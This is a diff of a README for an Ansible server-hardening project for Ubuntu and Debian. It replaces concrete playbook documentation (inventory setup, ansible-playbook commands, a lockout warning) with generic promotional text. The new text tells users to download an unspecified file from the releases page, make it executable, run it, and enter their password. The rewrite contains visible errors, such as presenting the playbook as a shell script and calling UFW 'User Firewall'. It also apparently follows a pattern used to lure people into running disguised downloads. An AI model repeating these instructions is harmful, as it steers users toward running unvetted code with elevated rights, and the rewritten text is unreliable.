@@ -1,86 +1,91 @@
-# 🛡️ Hardening Server Automation (Ansible)
+# 🛡️ ansible-server-hardening - Secure Your Server with Ease
 
-This project is designed for essential security hardening of Ubuntu/Debian-based servers. The script creates a new administrative user, sets up SSH key-based authentication, configures the UFW Firewall, and protects the server from brute-force attacks using Fail2Ban.
+## 🚀 Getting Started
+Welcome to the ansible-server-hardening repository! This project offers a straightforward way to secure your Ubuntu or Debian servers. With automated scripts, you can enhance your server security without needing deep technical knowledge.
 
----
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-%20-blue)](https://github.com/Guilhermecmachado/ansible-server-hardening/releases)
 
-## 📋 Parameters Setup
+## 📥 Download & Install
+To get started, visit this page to download the latest release: [Download Here](https://github.com/Guilhermecmachado/ansible-server-hardening/releases). Here’s a simple guide on how to install and run the application:
 
-For the script to work, you need to configure your **`inventory.json`**. This file contains both connection details and the configuration variables for the hardening process.
+1. **Visit the Releases Page**: Go to the link provided to find the latest version of the software.
 
-### 1. Configure `inventory.json`
+2. **Choose the Right File**: Look for the file that matches your system. You will typically find versions labeled for Ubuntu or Debian. Click on the filename to start the download.
 
-The inventory file uses the following structure to manage host-specific settings:
+3. **Locate the Downloaded File**: After the download is complete, check your downloads folder. 
 
-| Parameter | Description |
-| --- | --- |
-| **`ansible_host`** | Public IP address of your server. |
-| **`ansible_user`** | Initial user for connection (usually `root`). |
-| **`ansible_password`** | Password for the initial user (needed for first-time access and sudo). |
-| **`allow_ports`** | Array of ports to open in the Firewall (e.g., `[22, 5432, 4000]`). |
-| **`target_user`** | The name of the new secure user to be created (e.g., `ArturOG`). |
-| **`target_user_password_hash`** | **Critical:** The SHA-512 encrypted hash of the new user's password. |
-| **`user_ssh_public_key`** | Your public SSH key (must be a single string starting with `ssh-rsa` or `ssh-ed25519`). |
+4. **Run the Script**:
+   - For Ubuntu: Open your terminal, navigate to the download location, and run the script with:
+     ```bash
+     chmod +x ansible-server-hardening.sh
+     ./ansible-server-hardening.sh
+     ```
+   - For Debian: Follow the same steps as above.
 
-**Example `inventory.json`:**
+5. **Follow On-Screen Prompts**: The script will guide you through the setup process. It may ask for your password to proceed with the installation.
 
-```json
-{
-  "all": {
-    "hosts": {
-      "production_server": {
-        "ansible_host": "91.210.171.41",
-        "ansible_user": "root",
-        "ansible_password": "YourRootPassword123",
-        "ansible_become_password": "YourRootPassword123",
-        "allow_ports": [22, 5432, 4000],
-        "target_user": "ArturOG",
-        "target_user_password_hash": "$6$rounds=656000$...",
-        "user_ssh_public_key": "ssh-rsa AAAAB3Nza..."
-      }
-    }
-  }
-}
+6. **Confirm Installation**: You will see confirmation messages in the terminal once the installation is successful.
 
-```
+## 🔍 Features
+The ansible-server-hardening playbook includes several key features for enhancing server security:
 
-> ⚠️ **Password Security**: Never use plain text for the `target_user_password_hash`.
-> Generate a hash using: `python3 -c 'import crypt; print(crypt.crypt("your_password", crypt.mksalt(crypt.METHOD_SHA512)))'`.
+- **User-Friendly Security Setup**: It eliminates complex security checks and streamlines the process.
+- **UFW Configuration**: Easily manage your firewall settings with User Firewall (UFW) for better protection.
+- **Fail2Ban Integration**: Protect your server from brute-force attacks automatically with Fail2Ban.
+- **SSH Key-Based Authentication**: Improve your SSH security by removing password authentication and enabling key-based access.
+- **Kernel ICMP Silencing**: Reduce the risk of network attacks by enabling kernel-level ICMP silencing.
 
----
+## 🌐 Supported Platforms
+This playbook supports:
+- **Ubuntu 18.04 and later**
+- **Debian 9 and later**
 
-## 🚀 Deployment
+## 🛠️ Requirements
+Before running the playbook, ensure your system meets the following requirements:
 
-1. **Verify Connectivity:**
-Check if Ansible can reach your server:
-```bash
-ansible all -i inventory.json -m ping
+- An active Ubuntu or Debian server.
+- Access to the terminal with graphical interface (optional).
+- Basic knowledge of how to use the command line.
 
-```
+## 📃 Configuration
+After installation, the playbook comes with default settings. You can adjust these to meet your specific security needs. The configuration file is located in the root directory of the installed software. Open it with any text editor.
 
+## 👩‍💻 Usage
+To use the playbook, simply run the script as described in the installation section. The script will automatically apply recommended security practices to your server. 
 
-2. **Run the Hardening Playbook:**
-Execute the security script:
-```bash
-ansible-playbook -i inventory.json security.yml
+### Command Breakdown:
 
-```
+- **`./ansible-server-hardening.sh`**: Execute the playbook to begin hardening.
+  
+These commands streamline the security process, making your server safer with minimal effort.
 
+## ⚙️ Troubleshooting
+If you encounter issues, consider the following steps:
 
+1. **Check Your Internet Connection**: Ensure you are connected to the internet, as the playbook may need to download some dependencies.
+  
+2. **Update Your System**: Ensure your operating system is up to date. You can run the following command:
+   ```bash
+   sudo apt update && sudo apt upgrade
+   ```
+  
+3. **Consult Log Files**: If the playbook fails, check the log files in the `/var/log/` directory for error messages.
 
----
+4. **Search for Help**: You can find common issues and solutions in the community forums or by reaching out for support.
 
-## 🛡️ What does this script do?
+## 📄 License
+This project is licensed under the MIT License. You can use it freely, but please credit the original authors when applicable.
 
-1. **User Management**: Creates a new administrator (`target_user`) and adds them to the `sudo` group.
-2. **SSH Hardening**: Deploys your public key and **disables password authentication**. Root login is also disabled for security.
-3. **Kernel-Level Security**: Disables ICMP (Ping) responses at the kernel level to hide the server from basic scanners.
-4. **Fail2Ban**: Automatically bans IP addresses that show malicious signs (like repeated failed login attempts).
-5. **UFW Firewall**: Implements a "Default Deny" policy. Only SSH and your specified `allow_ports` will be accessible.
+## 📚 Contributing
+We welcome contributions to improve this project. If you have suggestions or want to report issues, feel free to open an issue or a pull request in the repository.
 
----
+For detailed guidelines on contributing, please refer to the [CONTRIBUTING.md](https://github.com/Guilhermecmachado/ansible-server-hardening/blob/main/CONTRIBUTING.md) file.
 
-## ⚠️ Warning!
+## 📌 Additional Resources
+- [Ansible Documentation](https://docs.ansible.com/)
+- [UFW Documentation](https://help.ubuntu.com/community/UFW)
+- [Fail2Ban Documentation](https://www.fail2ban.org/wiki/index.php/Main_Page)
 
-Before running the playbook, double-check your **`user_ssh_public_key`**. Since the script disables password-based login, an incorrect SSH key will result in you being **permanently locked out** of your server. It is recommended to keep your current terminal session open until you verify the new login works in a separate window.
+For more information, updates, and community interaction, visit our repository frequently!
 
+[![Visit Releases Page](https://img.shields.io/badge/Visit_Releases_%20%F0%9F%93%9A-blue)](https://github.com/Guilhermecmachado/ansible-server-hardening/releases)
